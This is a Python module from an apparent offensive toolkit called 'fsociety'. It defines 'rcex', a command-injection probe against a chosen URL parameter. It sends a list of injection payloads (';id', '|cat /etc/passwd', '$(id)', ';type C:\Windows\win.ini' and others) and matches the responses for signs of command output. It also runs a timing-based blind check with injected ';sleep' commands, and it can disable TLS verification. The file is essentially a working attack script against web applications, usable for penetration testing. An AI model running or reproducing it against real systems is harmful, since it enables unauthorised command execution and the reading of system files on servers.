from __future__ import annotations

import http.client
import json
import ssl
import time
import urllib.parse
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

RCE_MARKERS = [
    (r"uid=\d+\([^)]+\)\s+gid=\d+", "unix-id"),
    (r"root:x:0:0:", "passwd-read"),
    (r"uid=\d+", "id-output"),
    (r"Microsoft Windows \[Version", "windows-ver"),
    (r"Volume in drive", "win-dir"),
]

RCE_PAYLOADS = [
    ("cmd1", ";id"),
    ("cmd2", "|id"),
    ("cmd3", "`id`"),
    ("cmd4", "$(id)"),
    ("cmd5", "&&id"),
    ("cmd6", "||id"),
    ("cmd7", "%0aid"),
    ("cmd8", "%3Bid"),
    ("cmd9", "\nid"),
    ("cmd10", ";whoami"),
    ("cmd11", ";uname -a"),
    ("cmd12", ";cat /etc/passwd"),
    ("cmd13", "|cat /etc/passwd"),
    ("cmd14", ";dir"),
    ("cmd15", ";type C:\\Windows\\win.ini"),
]

@tool("rcex", "Remote command execution probe with blind timing checks", category="rce")
class Rcex:
    @staticmethod
    def build_parser(p):
        p.add_argument("url", help="target URL")
        p.add_argument("--param", required=True, help="parameter to inject")
        p.add_argument("--method", default="GET", choices=["GET", "POST"])
        p.add_argument("--timeout", type=float, default=10.0)
        p.add_argument("--insecure", action="store_true")
        p.add_argument("--blind", action="store_true", help="run timing-based blind check")
        p.add_argument("--sleep", type=float, default=5.0)
        p.add_argument("--cookie", help="Cookie header value")
        p.add_argument("--header", action="append", default=[], help="extra header, key:value")
        p.add_argument("-o", "--out")

    @staticmethod
    def _ctx(insecure: bool):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _send(url: str, method: str, param: str, value: str, timeout: float,
              ctx, cookie: str | None, extra_headers: list[str]):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        headers = {"User-Agent": "fsociety-rcex/1.0"}
        if cookie:
            headers["Cookie"] = cookie
        for spec in extra_headers:
            if ":" in spec:
                k, v = spec.split(":", 1)
                headers[k.strip()] = v.strip()

        if method == "GET":
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [value]
            target = parsed.path or "/"
            query = urllib.parse.urlencode(qs, doseq=True)
            conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) 
                    if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
            started = time.time()
            conn.request("GET", f"{target}?{query}", headers=headers)
        else:
            body = urllib.parse.urlencode({param: value})
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            target = parsed.path or "/"
            if parsed.query:
                target += f"?{parsed.query}"
            conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
                    if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
            started = time.time()
            conn.request("POST", target, body=body, headers=headers)
        try:
            resp = conn.getresponse()
            data = resp.read(16384)
            return resp.status, data, time.time() - started
        finally:
            conn.close()

    @staticmethod
    def _match(text: str):
        for pattern, tag in RCE_MARKERS:
            import re
            if re.search(pattern, text):
                return tag
        return None

    @staticmethod
    def run(args, log: Log) -> int:
        ctx = Rcex._ctx(args.insecure)
        hits = []

        for tag, payload in RCE_PAYLOADS:
            try:
                status, data, elapsed = Rcex._send(args.url, args.method, args.param,
                                                   payload, args.timeout, ctx,
                                                   args.cookie, args.header)
            except (OSError, ssl.SSLError, http.client.HTTPException) as exc:
                log.warn(f"{tag}: {exc}")
                continue
            text = data.decode("utf-8", "ignore")
            marker = Rcex._match(text)
            if marker:
                hit = {"tag": tag, "payload": payload, "status": status,
                       "signal": marker, "ms": round(elapsed * 1000, 1)}
                hits.append(hit)
                log.hit(f"{tag} {marker} via {payload!r}")

        if args.blind:
            sleep_cmd = f";sleep {args.sleep}"
            try:
                _, _, base = Rcex._send(args.url, args.method, args.param,
                                        "1", args.timeout, ctx, args.cookie, args.header)
            except (OSError, ssl.SSLError, http.client.HTTPException):
                base = 0.0
            try:
                _, _, slow = Rcex._send(args.url, args.method, args.param,
                                        sleep_cmd, args.timeout + args.sleep,
                                        ctx, args.cookie, args.header)
            except (OSError, ssl.SSLError, http.client.HTTPException) as exc:
                log.warn(f"blind: {exc}")
                slow = 0.0
            delta = slow - base
            log.info(f"blind delta: {delta:.2f}s (baseline {base:.2f}s)")
            if delta >= args.sleep * 0.7:
                hit = {"tag": "blind", "payload": sleep_cmd,
                       "signal": "time-delay", "delta_s": round(delta, 2)}
                hits.append(hit)
                log.hit(f"blind via time delay ({delta:.2f}s)")

        if args.out and hits:
            Path(args.out).write_text(json.dumps(hits, indent=2))
            log.ok(f"{len(hits)} hit(s) -> {args.out}")
        log.ok(f"{len(hits)} hit(s)")
        return 0 if hits else 1
